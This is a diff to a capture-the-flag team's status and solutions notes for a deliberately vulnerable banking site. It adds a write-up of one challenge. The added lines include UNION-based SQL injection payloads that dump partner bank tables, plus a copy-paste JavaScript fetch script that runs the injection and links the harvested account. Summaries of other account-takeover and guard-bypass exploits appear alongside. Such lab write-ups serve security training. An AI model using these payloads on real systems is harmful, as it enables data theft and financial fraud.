@@ -1,7 +1,7 @@
 # DarkMoney CTF — Status & Solutions
 
-**Competition:** Schwab 2026 Advanced | **Team score:** 6040 | **Team rank:** improving  
-**Progress:** 29 of 37 challenges solved  
+**Competition:** Schwab 2026 Advanced | **Team score:** 6290 | **Team rank:** improving  
+**Progress:** 30 of 37 challenges solved  
 **Target:** https://50-18-145-16-darkmoneyprod.vulnerablesites.net  
 **Tracker:** https://crwd-ctrl.net/d9e8f33f-db5e-405c-8236-499d2f0df794  
 **Account:** Alice Morgan (user ID 1, clientId DM-CLIENT-A9F131)
@@ -45,6 +45,7 @@
 
 | Frozen Assets | Alpaca | 200 | SQLi reset grahman's (user 5) password → `POST /api/auth/reset-password` with token unlocks LOCKED account → login as grahman → `POST /api/bill-pay/payments` with `fromAccountNumber: "DMACC1005"` → auto-detected |
 | Mirror Ledger | Alpaca | 250 | Java `startsWith("DMACCEXT")` check is case-sensitive but MySQL lookup is case-insensitive — send lowercase `dmaccext0001` as `fromAccountNumber` to bypass guard while DB resolves the shadow account → auto-detected |
+| The Number Checks Out | Hippo | 250 | SQLi on `/api/manual-links/connector` to dump partner_bank (Bank of Lethe code=`DM-BOL-0517`) and partner_bank_account (account `99692174030`) → `POST /api/manual-links` with both → auto-detected |
 
 **Total earned: 6040 pts**
 
@@ -168,6 +169,28 @@
 - **Response:** `{"link_signing_key":"D3E346z93-ecbT72d2c9a66e", ...}`
 - **Submission:** Submitted `D3E346z93-ecbT72d2c9a66e` to crwd-ctrl SUBMIT form under "Signing Key" field (+300 pts)
 
+### The Number Checks Out — 250 pts ✅
+- **Vulnerability:** SQLi on `/api/manual-links/connector?connectorId=` to exfiltrate partner bank connector ID and account number, then use manual link endpoint to link the account
+- **Step 1 — Get Bank of Lethe connector:** `GET /api/manual-links/connector?connectorId=DM-BOL-0517` returns `{bankName: "Bank of Lethe", connectorType: "MANUAL"}` (connector already known from partner_bank dump)
+- **Step 2 — Dump partner_bank table:** `xxx' UNION SELECT GROUP_CONCAT(id,'|',code,'|',name SEPARATOR ';;'),'x','x' FROM partner_bank-- -` → Bank of Lethe = id 11, code `DM-BOL-0517`
+- **Step 3 — Dump partner_bank_account for id 11:** `xxx' UNION SELECT GROUP_CONCAT(id,'|',account_number,'|',partner_bank_id SEPARATOR ';;'),'x','x' FROM partner_bank_account WHERE partner_bank_id>=9-- -` → account `99692174030`
+- **Step 4 — Link the account:** `POST /api/manual-links` `{"connectorId":"DM-BOL-0517","accountNumber":"99692174030","nickname":"Lethe Account"}` → 201 `{pendingId:2,...}` → auto-detected
+
+**COPY-PASTE SOLUTION:**
+```javascript
+// Step 1: Find Bank of Lethe connector
+await fetch("/api/manual-links/connector?connectorId=" + encodeURIComponent("xxx' UNION SELECT GROUP_CONCAT(id,'|',code,'|',name SEPARATOR ';;'),'x','x' FROM partner_bank-- -"), {credentials:'include'}).then(r=>r.json())
+// Result: code=DM-BOL-0517 for Bank of Lethe
+
+// Step 2: Find Bank of Lethe account number
+await fetch("/api/manual-links/connector?connectorId=" + encodeURIComponent("xxx' UNION SELECT GROUP_CONCAT(id,'|',account_number,'|',partner_bank_id SEPARATOR ';;'),'x','x' FROM partner_bank_account WHERE partner_bank_id>=9-- -"), {credentials:'include'}).then(r=>r.json())
+// Result: account_number=99692174030 for partner_bank_id=11
+
+// Step 3: Link the account
+await fetch('/api/manual-links', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({connectorId:'DM-BOL-0517', accountNumber:'99692174030', nickname:'Lethe Account'})}).then(r=>r.json())
+// 201 → crwd-ctrl auto-detects
+```
+
 ---
 
 ## 🔒 LOCKED / NOT YET UNLOCKED
@@ -176,7 +199,7 @@ Additional challenges are still locked (unlock by completing prerequisites):
 - Trex: 3 locked challenges
 - Alpaca: 3 locked challenges
 - Octopus: 1 locked challenge (after Seer's Sigil — now unlocked: A Foregone Prophecy, Author of the Verdict, A Runner Misdirected)
-- Hippo: 1 locked challenge (Inside Line completed; The Name Checks Out, The Number Checks Out remain)
+- Hippo: all known challenges solved ✅
 
 ---
 
